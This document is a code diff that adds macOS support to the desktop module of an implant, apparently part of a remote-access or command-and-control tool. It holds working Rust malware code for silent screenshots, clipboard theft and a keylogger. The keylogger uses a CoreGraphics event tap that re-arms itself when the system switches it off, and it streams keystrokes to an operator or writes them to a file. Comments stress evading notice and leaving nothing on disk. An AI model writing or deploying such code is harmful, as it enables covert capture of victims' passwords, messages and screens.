@@ -1,12 +1,17 @@
-//! The Windows extras: the screen, the clipboard and the keyboard.
+//! The desktop extras: the screen, the clipboard and the keyboard.
 //!
-//! Everything here is plain Win32 through the FFI, so the implant does not
-//! take a dependency for it.  The calls are the ones the platform
-//! documents, and the module only exists on Windows: every other platform
-//! answers "that is a Windows capability".
+//! On Windows everything here is plain Win32 through the FFI, so the
+//! implant does not take a dependency for it.  On macOS the same three
+//! things are done with the frameworks of the system: the capture comes
+//! from screencapture, the clipboard from pbpaste, and the keys from an
+//! event tap of CoreGraphics.
 //!
-//! The screen is captured as a BMP: the pixels come straight out of GDI, and
-//! the console turns the file into a PNG when it saves it.
+//! The screen is captured as a BMP on Windows: the pixels come straight
+//! out of GDI, and the console turns the file into a PNG when it saves
+//! it.  On macOS the capture is a PNG already.
+//!
+//! Every other platform answers "that is a Windows or macOS capability",
+//! because the implant says what it cannot do instead of pretending.
 
 use crate::task::Outcome;
 
@@ -303,10 +308,10 @@ pub fn keylog_to_file(path: &str, seconds: u64) -> Result<String, String> {
     Ok(format!("the key logger writes to {path}\n"))
 }
 
-/// The key logger that writes into a file is a Windows capability.
-#[cfg(not(windows))]
+/// The key logger that writes into a file is a Windows or macOS capability.
+#[cfg(not(any(windows, target_os = "macos")))]
 pub fn keylog_to_file(_path: &str, _seconds: u64) -> Result<String, String> {
-    Err("the key logger is a Windows capability".to_string())
+    Err("the key logger is a Windows or macOS capability".to_string())
 }
 
 /// The name of a virtual key code.
@@ -339,20 +344,325 @@ fn describe(vk: u16) -> String {
     format!("VK_{vk:02X}")
 }
 
-/// The screen is a Windows capability.
-#[cfg(not(windows))]
+/// The screen is a Windows or macOS capability.
+#[cfg(not(any(windows, target_os = "macos")))]
 pub fn screen() -> Result<Vec<u8>, String> {
-    Err("the screen is a Windows capability".to_string())
+    Err("the screen is a Windows or macOS capability".to_string())
 }
 
-/// The clipboard is a Windows capability.
-#[cfg(not(windows))]
+/// The clipboard is a Windows or macOS capability.
+#[cfg(not(any(windows, target_os = "macos")))]
 pub fn clipboard() -> Result<String, String> {
-    Err("the clipboard is a Windows capability".to_string())
+    Err("the clipboard is a Windows or macOS capability".to_string())
 }
 
-/// The key logger is a Windows capability.
-#[cfg(not(windows))]
+/// The key logger is a Windows or macOS capability.
+#[cfg(not(any(windows, target_os = "macos")))]
 pub fn keylog(_seconds: u64) -> Result<crate::sessions::Stream, String> {
-    Err("the key logger is a Windows capability".to_string())
+    Err("the key logger is a Windows or macOS capability".to_string())
+}
+
+// ---------------------------------------------------------------------------
+// macOS
+// ---------------------------------------------------------------------------
+
+/// The CoreGraphics and CoreFoundation calls of the event tap.
+///
+/// The declarations are the ones of the frameworks of the system, and
+/// the implant takes no dependency for them: the key logger of macOS
+/// needs nothing but the frameworks that are always there.
+#[cfg(target_os = "macos")]
+mod quartz {
+    use std::os::raw::{c_char, c_void};
+
+    pub type CFTypeRef = *const c_void;
+    pub type CFStringRef = *mut c_void;
+    pub type CFRunLoopRef = *mut c_void;
+    pub type CFMachPortRef = *mut c_void;
+    pub type CGEventRef = *mut c_void;
+    pub type CGEventTapProxy = *mut c_void;
+    pub type CGEventMask = u64;
+
+    pub const KCG_HID_EVENT_TAP: u32 = 0;
+    pub const KCG_HEAD_INSERT_EVENT_TAP: u32 = 0;
+    pub const KCG_EVENT_TAP_OPTION_LISTEN_ONLY: u32 = 0x0000_0001;
+    pub const KCG_EVENT_MASK_KEY_DOWN: CGEventMask = 1 << 10;
+    pub const KCG_EVENT_KEY_DOWN: u32 = 10;
+    pub const KCG_EVENT_TAP_DISABLED_BY_TIMEOUT: u32 = 0xFFFF_FFFE;
+    pub const KCG_EVENT_TAP_DISABLED_BY_USER_INPUT: u32 = 0xFFFF_FFFF;
+    pub const KCF_STRING_ENCODING_UTF8: u32 = 0x0800_0100;
+
+    pub type TapCallback = extern "C" fn(
+        proxy: CGEventTapProxy,
+        event_type: u32,
+        event: CGEventRef,
+        user_info: *mut c_void,
+    ) -> CGEventRef;
+
+    #[link(name = "CoreGraphics", kind = "framework")]
+    extern "C" {
+        pub fn CGEventTapCreate(
+            tap: u32,
+            place: u32,
+            options: u32,
+            events_of_interest: CGEventMask,
+            callback: TapCallback,
+            user_info: *mut c_void,
+        ) -> CFMachPortRef;
+        pub fn CGEventTapEnable(tap: CFMachPortRef, enable: bool);
+        pub fn CGEventKeyboardGetUnicodeString(
+            event: CGEventRef,
+            max_length: u32,
+            actual_length: *mut u32,
+            unicode_string: *mut u16,
+        );
+    }
+
+    #[link(name = "CoreFoundation", kind = "framework")]
+    extern "C" {
+        pub fn CFRunLoopGetCurrent() -> CFRunLoopRef;
+        pub fn CFRunLoopSourceCreate(
+            allocator: CFTypeRef,
+            source: CFMachPortRef,
+        ) -> *mut c_void;
+        pub fn CFRunLoopAddSource(
+            loop_ref: CFRunLoopRef,
+            source: *mut c_void,
+            mode: CFStringRef,
+        );
+        pub fn CFRunLoopRunInMode(
+            mode: CFStringRef,
+            seconds: f64,
+            return_after_source_handled: bool,
+        ) -> i32;
+        pub fn CFStringCreateWithCString(
+            alloc: CFTypeRef,
+            c_str: *const c_char,
+            encoding: u32,
+        ) -> CFStringRef;
+        pub fn CFRelease(cf: CFTypeRef);
+        pub fn CFMachPortInvalidate(port: CFMachPortRef);
+    }
+}
+
+/// Where the keys go.
+#[cfg(target_os = "macos")]
+enum Sink {
+    /// The stream the operator watches.
+    Stream(std::sync::mpsc::Sender<Vec<u8>>),
+    /// The file that keeps the whole of the session.
+    File(std::fs::File),
+}
+
+/// The state of the event tap.
+#[cfg(target_os = "macos")]
+struct TapContext {
+    sink: std::sync::Mutex<Sink>,
+    tap: std::sync::atomic::AtomicPtr<std::os::raw::c_void>,
+}
+
+/// The callback of the event tap.
+///
+/// It runs on the run loop of the thread that opened the tap, so it only
+/// writes into the sink and never blocks: a key logger that slows the
+/// machine down is a key logger that gets noticed.
+#[cfg(target_os = "macos")]
+extern "C" fn tap_callback(
+    _proxy: quartz::CGEventTapProxy,
+    event_type: u32,
+    event: quartz::CGEventRef,
+    user_info: *mut std::os::raw::c_void,
+) -> quartz::CGEventRef {
+    if user_info.is_null() {
+        return event;
+    }
+    let context = unsafe { &*(user_info as *const TapContext) };
+    if event_type == quartz::KCG_EVENT_TAP_DISABLED_BY_TIMEOUT
+        || event_type == quartz::KCG_EVENT_TAP_DISABLED_BY_USER_INPUT
+    {
+        // The system switched the tap off: it is switched on again.
+        let tap = context.tap.load(std::sync::atomic::Ordering::Relaxed);
+        if !tap.is_null() {
+            unsafe { quartz::CGEventTapEnable(tap, true) };
+        }
+        return event;
+    }
+    if event_type != quartz::KCG_EVENT_KEY_DOWN {
+        return event;
+    }
+    let text = unsafe { key_text(event) };
+    if text.is_empty() {
+        return event;
+    }
+    if let Ok(mut sink) = context.sink.lock() {
+        match &mut *sink {
+            Sink::Stream(sender) => {
+                let _ = sender.send(text.into_bytes());
+            }
+            Sink::File(file) => {
+                use std::io::Write;
+                let _ = file.write_all(text.as_bytes());
+            }
+        }
+    }
+    event
+}
+
+/// The text of a key press.
+#[cfg(target_os = "macos")]
+unsafe fn key_text(event: quartz::CGEventRef) -> String {
+    let mut buffer = [0u16; 8];
+    let mut length: u32 = 0;
+    quartz::CGEventKeyboardGetUnicodeString(
+        event,
+        buffer.len() as u32,
+        &mut length,
+        buffer.as_mut_ptr(),
+    );
+    if length == 0 {
+        return String::new();
+    }
+    String::from_utf16_lossy(&buffer[..length as usize])
+}
+
+/// Run an event tap for a while and write the keys into the sink.
+#[cfg(target_os = "macos")]
+fn run_tap(sink: Sink, seconds: u64) -> Result<(), String> {
+    let context = Box::into_raw(Box::new(TapContext {
+        sink: std::sync::Mutex::new(sink),
+        tap: std::sync::atomic::AtomicPtr::new(std::ptr::null_mut()),
+    }));
+    unsafe {
+        let tap = quartz::CGEventTapCreate(
+            quartz::KCG_HID_EVENT_TAP,
+            quartz::KCG_HEAD_INSERT_EVENT_TAP,
+            quartz::KCG_EVENT_TAP_OPTION_LISTEN_ONLY,
+            quartz::KCG_EVENT_MASK_KEY_DOWN,
+            tap_callback,
+            context as *mut std::os::raw::c_void,
+        );
+        if tap.is_null() {
+            drop(Box::from_raw(context));
+            return Err(
+                "the event tap was refused: the implant needs the permission of the accessibility"
+                    .to_string(),
+            );
+        }
+        (*context)
+            .tap
+            .store(tap as *mut std::os::raw::c_void, std::sync::atomic::Ordering::Relaxed);
+        quartz::CGEventTapEnable(tap, true);
+
+        let name = match std::ffi::CString::new("kCFRunLoopDefaultMode") {
+            Ok(name) => name,
+            Err(_) => {
+                quartz::CFMachPortInvalidate(tap);
+                drop(Box::from_raw(context));
+                return Err("the run loop mode could not be built".to_string());
+            }
+        };
+        let mode = quartz::CFStringCreateWithCString(
+            std::ptr::null(),
+            name.as_ptr(),
+            quartz::KCF_STRING_ENCODING_UTF8,
+        );
+        if mode.is_null() {
+            quartz::CFMachPortInvalidate(tap);
+            drop(Box::from_raw(context));
+            return Err("the run loop mode could not be built".to_string());
+        }
+        let source = quartz::CFRunLoopSourceCreate(std::ptr::null(), tap);
+        let loop_ref = quartz::CFRunLoopGetCurrent();
+        quartz::CFRunLoopAddSource(loop_ref, source, mode);
+        // The run loop returns when the time is up, and the tap is
+        // invalidated on the way out so no callback can come after the
+        // state is gone.
+        quartz::CFRunLoopRunInMode(mode, seconds as f64, false);
+        quartz::CFMachPortInvalidate(tap);
+        quartz::CFRelease(mode as quartz::CFTypeRef);
+        drop(Box::from_raw(context));
+    }
+    Ok(())
+}
+
+/// The capture of the screen, as a PNG file.
+///
+/// The capture comes from screencapture, the tool of the system, so the
+/// implant takes no dependency for it.  The file is removed as soon as
+/// it is read: the operator has the bytes and the disk has nothing.
+#[cfg(target_os = "macos")]
+pub fn screen() -> Result<Vec<u8>, String> {
+    let path = std::env::temp_dir().join(format!("umbra-screen-{}.png", std::process::id()));
+    let out = std::process::Command::new("/usr/sbin/screencapture")
+        .arg("-x")
+        .arg("-t")
+        .arg("png")
+        .arg(&path)
+        .output()
+        .map_err(|e| format!("screencapture: {e}"))?;
+    if !out.status.success() {
+        let _ = std::fs::remove_file(&path);
+        return Err(format!(
+            "screencapture: {}",
+            String::from_utf8_lossy(&out.stderr).trim()
+        ));
+    }
+    let data = std::fs::read(&path).map_err(|e| format!("the capture could not be read: {e}"))?;
+    let _ = std::fs::remove_file(&path);
+    Ok(data)
+}
+
+/// The text on the clipboard.
+#[cfg(target_os = "macos")]
+pub fn clipboard() -> Result<String, String> {
+    let out = std::process::Command::new("/usr/bin/pbpaste")
+        .output()
+        .map_err(|e| format!("pbpaste: {e}"))?;
+    if !out.status.success() {
+        return Err(format!(
+            "pbpaste: {}",
+            String::from_utf8_lossy(&out.stderr).trim()
+        ));
+    }
+    Ok(String::from_utf8_lossy(&out.stdout).to_string())
+}
+
+/// The key logger.
+///
+/// The keys come from an event tap of CoreGraphics: the tap hands every
+/// key press to a callback, and the callback writes it into the stream.
+/// The tap is opened in listening mode, so nothing that is typed is
+/// swallowed, and it needs the permission of the accessibility: without
+/// it the system refuses the tap and the operator is told why.
+#[cfg(target_os = "macos")]
+pub fn keylog(seconds: u64) -> Result<crate::sessions::Stream, String> {
+    let (tx, rx) = std::sync::mpsc::channel::<Vec<u8>>();
+    let handle = std::thread::spawn(move || {
+        run_tap(Sink::Stream(tx), seconds)?;
+        Ok(Outcome::ok(b"the key logger stopped\n".to_vec()))
+    });
+    Ok(crate::sessions::Stream::new(rx, handle))
+}
+
+/// Write the keys into a file instead of streaming them.
+#[cfg(target_os = "macos")]
+pub fn keylog_to_file(path: &str, seconds: u64) -> Result<String, String> {
+    let path = path.to_string();
+    std::thread::spawn(move || {
+        let file = match std::fs::OpenOptions::new()
+            .create(true)
+            .append(true)
+            .open(&path)
+        {
+            Ok(f) => f,
+            Err(e) => {
+                eprintln!("key logger: {path}: {e}");
+                return;
+            }
+        };
+        if let Err(e) = run_tap(Sink::File(file), seconds) {
+            eprintln!("key logger: {path}: {e}");
+        }
+    });
+    Ok(format!("the key logger writes to {path}\n"))
 }
